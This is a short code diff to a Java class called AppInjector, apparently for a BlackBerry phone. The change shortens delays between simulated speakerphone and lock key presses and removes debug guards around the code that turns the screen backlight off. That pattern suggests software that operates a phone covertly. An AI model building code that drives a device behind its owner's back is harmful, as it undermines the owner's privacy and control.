@@ -204,9 +204,9 @@ public class AppInjector {
             //#endif
 
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
-            Utils.sleep(500);
+            Utils.sleep(200);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
-            Utils.sleep(500);
+            Utils.sleep(200);
             setBacklight(false);
             Utils.sleep(500);
             for (int i = 0; i < 10; i++) {
@@ -227,16 +227,12 @@ public class AppInjector {
 
     private boolean backlight() {
         boolean ret = false;
-        //#ifndef DEBUG
         ret = Backlight.isEnabled();
-        //#endif
         return ret;
     }
 
     private void setBacklight(boolean value) {
-        //#ifndef DEBUG
         Backlight.enable(value);
-        //#endif
     }
 
     private boolean checkForeground() {
